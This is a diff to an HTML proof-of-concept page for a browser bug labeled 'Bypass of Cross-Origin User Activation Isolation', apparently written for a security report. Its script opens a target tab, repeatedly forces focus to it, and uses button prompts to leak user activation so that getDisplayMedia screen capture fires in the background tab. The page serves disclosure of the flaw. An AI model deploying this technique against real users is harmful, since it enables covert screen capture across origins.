@@ -4,38 +4,37 @@
 
     <h1>Bypass of Cross-Origin User Activation Isolation</h1>
     
-    <button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 10px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
-        1. Click 2x Here
+    <button id="enter-btn" style="padding: 20px 40px; font-size: 20px; margin-bottom: 20px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 8px; font-weight: bold;">
+        1. Click & HOLD "Enter" Key Here
     </button>
 
     <br>
 
-    <button id="enter-btn" style="padding: 20px 40px; font-size: 20px; margin-bottom: 20px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 8px; font-weight: bold;">
-        2. Press & HOLD "Enter" Key Here
+    <button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 20px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
+        2. Then Double Click & Hold Enter Again
     </button>
 
-    <div style="border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin: 0 auto;">
-        <p><b>Instructions:</b></p>
-        <p>1. Double click the dark button.</p>
-        <p>2. Hover/Click the red button, then <b>Press & HOLD Enter</b>.</p>
-        <p>3. Keep holding while the target tab opens and focus returns here.</p>
+    <div style="border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 550px; margin: 0 auto; text-align: left;">
+        <p><b>Steps to Reproduce:</b></p>
+        <ol>
+            <li>Hover/Click the <b>Red Button</b>, then <b>Press & HOLD "Enter"</b>.</li>
+            <li>Wait for the target tab to open and automatically return focus here.</li>
+            <li>While still holding/interacting, <b>Double Click</b> the dark button.</li>
+            <li><b>Result:</b> The activation leaks to the background tab and triggers <i>getDisplayMedia</i>.</li>
+        </ol>
     </div>
 
     <script>
         const targetURL = "https://cape-poc.vercel.app/";
         let opened = false;
         let victim = null;
-        document.getElementById('pre-focus-btn').addEventListener('dblclick', () => {
-            console.log("[*] Button double-clicked. Interaction primed.");
-            window.focus();
-        });
 
         document.addEventListener("keydown", (event) => {
             if (event.key !== "Enter") return;
             if (event.repeat || opened) return;
 
             opened = true;
-            console.log("[*] Keydown detected. Opening target...");
+            console.log("[*] Opening target tab...");
             victim = window.open(targetURL, "_blank");
             const focusInterval = setInterval(() => {
                 if (!victim || victim.closed) {
@@ -43,11 +42,15 @@
                     opened = false;
                     return;
                 }
-
                 try {
-                    victim.focus();
+                    victim.focus(); 
                 } catch (e) { }
             }, 100);
+        });
+
+        document.getElementById('pre-focus-btn').addEventListener('dblclick', () => {
+            console.log("[*] Double-click detected. Priming fresh activation...");
+            if (victim) victim.focus();
         });
     </script>
 </body>
